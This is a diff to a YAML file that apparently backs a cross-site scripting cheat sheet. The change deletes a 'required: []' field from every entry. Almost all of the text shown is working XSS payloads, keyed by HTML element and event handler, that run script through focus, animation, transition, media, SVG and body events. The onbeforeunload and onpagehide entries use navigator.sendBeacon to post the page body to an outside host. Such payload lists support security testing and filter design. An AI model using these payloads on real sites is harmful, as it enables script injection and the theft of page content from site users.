@@ -4,7 +4,6 @@
   onafterscriptexecute:
     payloads:
     - <* onafterscriptexecute=alert(1)><script>1</script>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -12,14 +11,12 @@
     payloads:
     - '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s
       ease-in-out 0s 1 x;}</style><* id=x style="position:absolute;" onanimationcancel="print()"></*>'
-    required: []
     interaction: false
     browsers:
     - firefox
   onanimationend:
     payloads:
     - <style>@keyframes x{}</style><* style="animation-name:x" onanimationend="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -29,7 +26,6 @@
     payloads:
     - <style>@keyframes slidein {}</style><* style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2"
       onanimationiteration="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -38,7 +34,6 @@
   onanimationstart:
     payloads:
     - <style>@keyframes x{}</style><* style="animation-name:x" onanimationstart="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -47,14 +42,12 @@
   onbeforescriptexecute:
     payloads:
     - <* onbeforescriptexecute=alert(1)><script>1</script>
-    required: []
     interaction: false
     browsers:
     - firefox
   onblur:
     payloads:
     - <* onblur=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -63,7 +56,6 @@
   onclick:
     payloads:
     - <* onclick="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -72,7 +64,6 @@
   oncontextmenu:
     payloads:
     - <* oncontextmenu="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -81,7 +72,6 @@
   oncopy:
     payloads:
     - <* oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -90,7 +80,6 @@
   oncut:
     payloads:
     - <* oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -99,7 +88,6 @@
   ondblclick:
     payloads:
     - <* ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -108,7 +96,6 @@
   ondrag:
     payloads:
     - <* draggable="true" ondrag="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -117,7 +104,6 @@
   ondragend:
     payloads:
     - <* draggable="true" ondragend="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -126,7 +112,6 @@
   ondragenter:
     payloads:
     - <* draggable="true" ondragenter="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -135,7 +120,6 @@
   ondragleave:
     payloads:
     - <* draggable="true" ondragleave="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -145,7 +129,6 @@
     payloads:
     - <div draggable="true" contenteditable>drag me</div><* ondragover=alert(1) contenteditable
       style=display:block>drop here</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -154,7 +137,6 @@
   ondragstart:
     payloads:
     - <* draggable="true" ondragstart="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -164,7 +146,6 @@
     payloads:
     - <div draggable="true" contenteditable>drag me</div><* ondrop=alert(1) contenteditable
       style=display:block>drop here</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -173,7 +154,6 @@
   onfocusout:
     payloads:
     - <* onfocusout=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -182,7 +162,6 @@
   onkeydown:
     payloads:
     - <* onkeydown="alert(1)" contenteditable style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -191,7 +170,6 @@
   onkeypress:
     payloads:
     - <* onkeypress="alert(1)" contenteditable style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -200,7 +178,6 @@
   onkeyup:
     payloads:
     - <* onkeyup="alert(1)" contenteditable style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -209,7 +186,6 @@
   onmousedown:
     payloads:
     - <* onmousedown="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -218,7 +194,6 @@
   onmouseenter:
     payloads:
     - <* onmouseenter="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -227,7 +202,6 @@
   onmouseleave:
     payloads:
     - <* onmouseleave="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -236,7 +210,6 @@
   onmousemove:
     payloads:
     - <* onmousemove="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -245,7 +218,6 @@
   onmouseout:
     payloads:
     - <* onmouseout="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -254,7 +226,6 @@
   onmouseover:
     payloads:
     - <* onmouseover="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -263,7 +234,6 @@
   onmouseup:
     payloads:
     - <* onmouseup="alert(1)" style=display:block>test</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -272,14 +242,12 @@
   onmousewheel:
     payloads:
     - <* onmousewheel=alert(1) style=display:block>requires scrolling
-    required: []
     interaction: true
     browsers:
     - chrome
   onpointerdown:
     payloads:
     - <* onpointerdown=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -288,7 +256,6 @@
   onpointerenter:
     payloads:
     - <* onpointerenter=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -297,7 +264,6 @@
   onpointerleave:
     payloads:
     - <* onpointerleave=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -306,7 +272,6 @@
   onpointermove:
     payloads:
     - <* onpointermove=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -315,7 +280,6 @@
   onpointerout:
     payloads:
     - <* onpointerout=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -324,7 +288,6 @@
   onpointerover:
     payloads:
     - <* onpointerover=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -333,14 +296,12 @@
   onpointerrawupdate:
     payloads:
     - <* onpointerrawupdate=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
   onpointerup:
     payloads:
     - <* onpointerup=alert(1) style=display:block>XSS</*>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -349,14 +310,12 @@
   ontransitioncancel:
     payloads:
     - '<style>:target {color: red;}</style><* id=x style="transition:color 10s" ontransitioncancel=print()></*>'
-    required: []
     interaction: false
     browsers:
     - firefox
   ontransitionend:
     payloads:
     - <style>:target {color:red;}</style><* id=x style="transition:color 1s" ontransitionend=alert(1)></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -364,21 +323,18 @@
     payloads:
     - '<style>:target {transform: rotate(180deg);}</style><* id=x style="transition:transform
       2s" ontransitionrun=print()></*>'
-    required: []
     interaction: false
     browsers:
     - firefox
   ontransitionstart:
     payloads:
     - <style>:target {color:red;}</style><* id=x style="transition:color 1s" ontransitionstart=alert(1)></*>
-    required: []
     interaction: false
     browsers:
     - safari
   onwebkitanimationend:
     payloads:
     - <style>@keyframes x{}</style><* style="animation-name:x" onwebkitanimationend="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -387,7 +343,6 @@
     payloads:
     - <style>@keyframes slidein {}</style><* style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2"
       onwebkitanimationiteration="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -396,7 +351,6 @@
   onwebkitanimationstart:
     payloads:
     - <style>@keyframes x{}</style><* style="animation-name:x" onwebkitanimationstart="alert(1)"></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -404,7 +358,6 @@
   onwebkittransitionend:
     payloads:
     - <style>:target {color:red;}</style><* id=x style="transition:color 1s" onwebkittransitionend=alert(1)></*>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -412,7 +365,6 @@ a:
   onbeforecopy:
     payloads:
     - <a onbeforecopy="alert(1)" contenteditable>test</a>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -421,7 +373,6 @@ a:
   onbeforecut:
     payloads:
     - <a onbeforecut="alert(1)" contenteditable>test</a>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -430,7 +381,6 @@ a:
   onfocus:
     payloads:
     - <a id=x tabindex=1 onfocus=alert(1)></a>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -438,7 +388,6 @@ a:
   onfocusin:
     payloads:
     - <a id=x tabindex=1 onfocusin=alert(1)></a>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -446,7 +395,6 @@ a:
   onpaste:
     payloads:
     - <a onpaste="alert(1)" contenteditable>test</a>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -456,14 +404,12 @@ a2:
   onfocus:
     payloads:
     - <a autofocus onfocus=alert(1) href></a>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <a autofocus onfocusin=alert(1) href></a>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -471,7 +417,6 @@ abbr:
   onbeforecopy:
     payloads:
     - <abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -480,7 +425,6 @@ abbr:
   onbeforecut:
     payloads:
     - <abbr onbeforecut="alert(1)" contenteditable>test</abbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -489,7 +433,6 @@ abbr:
   onfocus:
     payloads:
     - <abbr id=x tabindex=1 onfocus=alert(1)></abbr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -497,7 +440,6 @@ abbr:
   onfocusin:
     payloads:
     - <abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -505,7 +447,6 @@ abbr:
   onpaste:
     payloads:
     - <abbr onpaste="alert(1)" contenteditable>test</abbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -515,7 +456,6 @@ acronym:
   onbeforecopy:
     payloads:
     - <acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -524,7 +464,6 @@ acronym:
   onbeforecut:
     payloads:
     - <acronym onbeforecut="alert(1)" contenteditable>test</acronym>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -533,7 +472,6 @@ acronym:
   onfocus:
     payloads:
     - <acronym id=x tabindex=1 onfocus=alert(1)></acronym>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -541,7 +479,6 @@ acronym:
   onfocusin:
     payloads:
     - <acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -549,7 +486,6 @@ acronym:
   onpaste:
     payloads:
     - <acronym onpaste="alert(1)" contenteditable>test</acronym>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -559,7 +495,6 @@ address:
   onbeforecopy:
     payloads:
     - <address onbeforecopy="alert(1)" contenteditable>test</address>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -568,7 +503,6 @@ address:
   onbeforecut:
     payloads:
     - <address onbeforecut="alert(1)" contenteditable>test</address>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -577,7 +511,6 @@ address:
   onfocus:
     payloads:
     - <address id=x tabindex=1 onfocus=alert(1)></address>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -585,7 +518,6 @@ address:
   onfocusin:
     payloads:
     - <address id=x tabindex=1 onfocusin=alert(1)></address>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -593,7 +525,6 @@ address:
   onpaste:
     payloads:
     - <address onpaste="alert(1)" contenteditable>test</address>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -603,7 +534,6 @@ animate:
   onbegin:
     payloads:
     - <svg><animate onbegin=alert(1) attributeName=x dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -612,7 +542,6 @@ animate:
   onend:
     payloads:
     - <svg><animate onend=alert(1) attributeName=x dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -621,7 +550,6 @@ animate:
   onrepeat:
     payloads:
     - <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -631,7 +559,6 @@ animatemotion:
   onbegin:
     payloads:
     - <svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -640,7 +567,6 @@ animatemotion:
   onend:
     payloads:
     - <svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -649,7 +575,6 @@ animatemotion:
   onrepeat:
     payloads:
     - <svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -659,7 +584,6 @@ animatetransform:
   onbegin:
     payloads:
     - <svg><animatetransform onbegin=alert(1) attributeName=transform>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -668,7 +592,6 @@ animatetransform:
   onend:
     payloads:
     - <svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -678,7 +601,6 @@ animatetransform:
     payloads:
     - <svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2
       dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -688,7 +610,6 @@ applet:
   onbeforecopy:
     payloads:
     - <applet onbeforecopy="alert(1)" contenteditable>test</applet>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -697,7 +618,6 @@ applet:
   onbeforecut:
     payloads:
     - <applet onbeforecut="alert(1)" contenteditable>test</applet>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -706,7 +626,6 @@ applet:
   onfocus:
     payloads:
     - <applet id=x tabindex=1 onfocus=alert(1)></applet>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -714,7 +633,6 @@ applet:
   onfocusin:
     payloads:
     - <applet id=x tabindex=1 onfocusin=alert(1)></applet>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -722,7 +640,6 @@ applet:
   onpaste:
     payloads:
     - <applet onpaste="alert(1)" contenteditable>test</applet>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -732,7 +649,6 @@ area:
   onbeforecopy:
     payloads:
     - <area onbeforecopy="alert(1)" contenteditable>test</area>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -741,7 +657,6 @@ area:
   onbeforecut:
     payloads:
     - <area onbeforecut="alert(1)" contenteditable>test</area>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -750,7 +665,6 @@ area:
   onfocus:
     payloads:
     - <img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -758,7 +672,6 @@ area:
   onfocusin:
     payloads:
     - <img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -766,7 +679,6 @@ area:
   onpaste:
     payloads:
     - <area onpaste="alert(1)" contenteditable>test</area>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -776,7 +688,6 @@ article:
   onbeforecopy:
     payloads:
     - <article onbeforecopy="alert(1)" contenteditable>test</article>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -785,7 +696,6 @@ article:
   onbeforecut:
     payloads:
     - <article onbeforecut="alert(1)" contenteditable>test</article>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -794,7 +704,6 @@ article:
   onfocus:
     payloads:
     - <article id=x tabindex=1 onfocus=alert(1)></article>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -802,7 +711,6 @@ article:
   onfocusin:
     payloads:
     - <article id=x tabindex=1 onfocusin=alert(1)></article>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -810,7 +718,6 @@ article:
   onpaste:
     payloads:
     - <article onpaste="alert(1)" contenteditable>test</article>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -820,7 +727,6 @@ aside:
   onbeforecopy:
     payloads:
     - <aside onbeforecopy="alert(1)" contenteditable>test</aside>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -829,7 +735,6 @@ aside:
   onbeforecut:
     payloads:
     - <aside onbeforecut="alert(1)" contenteditable>test</aside>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -838,7 +743,6 @@ aside:
   onfocus:
     payloads:
     - <aside id=x tabindex=1 onfocus=alert(1)></aside>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -846,7 +750,6 @@ aside:
   onfocusin:
     payloads:
     - <aside id=x tabindex=1 onfocusin=alert(1)></aside>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -854,7 +757,6 @@ aside:
   onpaste:
     payloads:
     - <aside onpaste="alert(1)" contenteditable>test</aside>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -864,7 +766,6 @@ audio:
   onbeforecopy:
     payloads:
     - <audio onbeforecopy="alert(1)" contenteditable>test</audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -873,7 +774,6 @@ audio:
   onbeforecut:
     payloads:
     - <audio onbeforecut="alert(1)" contenteditable>test</audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -882,7 +782,6 @@ audio:
   oncanplay:
     payloads:
     - <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -891,7 +790,6 @@ audio:
   ondurationchange:
     payloads:
     - <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -900,7 +798,6 @@ audio:
   onended:
     payloads:
     - <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -909,7 +806,6 @@ audio:
   onerror:
     payloads:
     - <audio src/onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -918,7 +814,6 @@ audio:
   onfocus:
     payloads:
     - <audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -926,7 +821,6 @@ audio:
   onfocusin:
     payloads:
     - <audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -934,7 +828,6 @@ audio:
   onloadeddata:
     payloads:
     - <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -943,7 +836,6 @@ audio:
   onloadedmetadata:
     payloads:
     - <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -952,7 +844,6 @@ audio:
   onpaste:
     payloads:
     - <audio onpaste="alert(1)" contenteditable>test</audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -961,7 +852,6 @@ audio:
   onpause:
     payloads:
     - <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -970,7 +860,6 @@ audio:
   onplay:
     payloads:
     - <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -979,7 +868,6 @@ audio:
   onplaying:
     payloads:
     - <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -988,7 +876,6 @@ audio:
   onprogress:
     payloads:
     - <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -997,7 +884,6 @@ audio:
   onseeked:
     payloads:
     - <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1006,7 +892,6 @@ audio:
   onseeking:
     payloads:
     - <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1016,7 +901,6 @@ audio:
     payloads:
     - <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav"
       type="audio/wav"></audio>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1026,7 +910,6 @@ audio:
     payloads:
     - <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav"
       type="audio/wav"></audio>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1036,14 +919,12 @@ audio2:
   onfocus:
     payloads:
     - <audio controls src=1 onfocus=alert(1) autofocus>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <audio controls src=1 onfocusin=alert(1) autofocus>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1051,7 +932,6 @@ b:
   onbeforecopy:
     payloads:
     - <b onbeforecopy="alert(1)" contenteditable>test</b>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1060,7 +940,6 @@ b:
   onbeforecut:
     payloads:
     - <b onbeforecut="alert(1)" contenteditable>test</b>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1069,7 +948,6 @@ b:
   onfocus:
     payloads:
     - <b id=x tabindex=1 onfocus=alert(1)></b>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1077,7 +955,6 @@ b:
   onfocusin:
     payloads:
     - <b id=x tabindex=1 onfocusin=alert(1)></b>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1085,7 +962,6 @@ b:
   onpaste:
     payloads:
     - <b onpaste="alert(1)" contenteditable>test</b>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1095,7 +971,6 @@ bdi:
   onbeforecopy:
     payloads:
     - <bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1104,7 +979,6 @@ bdi:
   onbeforecut:
     payloads:
     - <bdi onbeforecut="alert(1)" contenteditable>test</bdi>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1113,7 +987,6 @@ bdi:
   onfocus:
     payloads:
     - <bdi id=x tabindex=1 onfocus=alert(1)></bdi>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1121,7 +994,6 @@ bdi:
   onfocusin:
     payloads:
     - <bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1129,7 +1001,6 @@ bdi:
   onpaste:
     payloads:
     - <bdi onpaste="alert(1)" contenteditable>test</bdi>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1139,7 +1010,6 @@ bdo:
   onbeforecopy:
     payloads:
     - <bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1148,7 +1018,6 @@ bdo:
   onbeforecut:
     payloads:
     - <bdo onbeforecut="alert(1)" contenteditable>test</bdo>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1157,7 +1026,6 @@ bdo:
   onfocus:
     payloads:
     - <bdo id=x tabindex=1 onfocus=alert(1)></bdo>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1165,7 +1033,6 @@ bdo:
   onfocusin:
     payloads:
     - <bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1173,7 +1040,6 @@ bdo:
   onpaste:
     payloads:
     - <bdo onpaste="alert(1)" contenteditable>test</bdo>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1183,7 +1049,6 @@ big:
   onbeforecopy:
     payloads:
     - <big onbeforecopy="alert(1)" contenteditable>test</big>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1192,7 +1057,6 @@ big:
   onbeforecut:
     payloads:
     - <big onbeforecut="alert(1)" contenteditable>test</big>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1201,7 +1065,6 @@ big:
   onfocus:
     payloads:
     - <big id=x tabindex=1 onfocus=alert(1)></big>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1209,7 +1072,6 @@ big:
   onfocusin:
     payloads:
     - <big id=x tabindex=1 onfocusin=alert(1)></big>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1217,7 +1079,6 @@ big:
   onpaste:
     payloads:
     - <big onpaste="alert(1)" contenteditable>test</big>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1227,7 +1088,6 @@ blink:
   onbeforecopy:
     payloads:
     - <blink onbeforecopy="alert(1)" contenteditable>test</blink>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1236,7 +1096,6 @@ blink:
   onbeforecut:
     payloads:
     - <blink onbeforecut="alert(1)" contenteditable>test</blink>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1245,7 +1104,6 @@ blink:
   onfocus:
     payloads:
     - <blink id=x tabindex=1 onfocus=alert(1)></blink>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1253,7 +1111,6 @@ blink:
   onfocusin:
     payloads:
     - <blink id=x tabindex=1 onfocusin=alert(1)></blink>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1261,7 +1118,6 @@ blink:
   onpaste:
     payloads:
     - <blink onpaste="alert(1)" contenteditable>test</blink>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1271,7 +1127,6 @@ blockquote:
   onbeforecopy:
     payloads:
     - <blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1280,7 +1135,6 @@ blockquote:
   onbeforecut:
     payloads:
     - <blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1289,7 +1143,6 @@ blockquote:
   onfocus:
     payloads:
     - <blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1297,7 +1150,6 @@ blockquote:
   onfocusin:
     payloads:
     - <blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1305,7 +1157,6 @@ blockquote:
   onpaste:
     payloads:
     - <blockquote onpaste="alert(1)" contenteditable>test</blockquote>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1315,7 +1166,6 @@ body:
   onafterprint:
     payloads:
     - <body onafterprint=alert(1)>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1323,7 +1173,6 @@ body:
   onbeforecopy:
     payloads:
     - <body onbeforecopy="alert(1)" contenteditable>test</body>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1332,7 +1181,6 @@ body:
   onbeforecut:
     payloads:
     - <body onbeforecut="alert(1)" contenteditable>test</body>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1341,7 +1189,6 @@ body:
   onbeforeprint:
     payloads:
     - <body onbeforeprint=console.log(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1349,7 +1196,6 @@ body:
   onbeforeunload:
     payloads:
     - <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1357,7 +1203,6 @@ body:
   onerror:
     payloads:
     - <body onerror=alert(1) onload=/>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1366,7 +1211,6 @@ body:
   onfocus:
     payloads:
     - <body id=x tabindex=1 onfocus=alert(1)></body>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1374,7 +1218,6 @@ body:
   onfocusin:
     payloads:
     - <body id=x tabindex=1 onfocusin=alert(1)></body>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1382,7 +1225,6 @@ body:
   onhashchange:
     payloads:
     - <body onhashchange="print()">
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1391,7 +1233,6 @@ body:
   onload:
     payloads:
     - <body onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1400,7 +1241,6 @@ body:
   onmessage:
     payloads:
     - <body onmessage=print()>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1409,7 +1249,6 @@ body:
   onpagehide:
     payloads:
     - <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1417,7 +1256,6 @@ body:
   onpageshow:
     payloads:
     - <body onpageshow=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1426,7 +1264,6 @@ body:
   onpaste:
     payloads:
     - <body onpaste="alert(1)" contenteditable>test</body>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1435,7 +1272,6 @@ body:
   onpopstate:
     payloads:
     - <body onpopstate=print()>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1444,7 +1280,6 @@ body:
   onresize:
     payloads:
     - <body onresize="print()">
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1453,7 +1288,6 @@ body:
   onscroll:
     payloads:
     - <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
-    required: []
     interaction: false
     browsers:
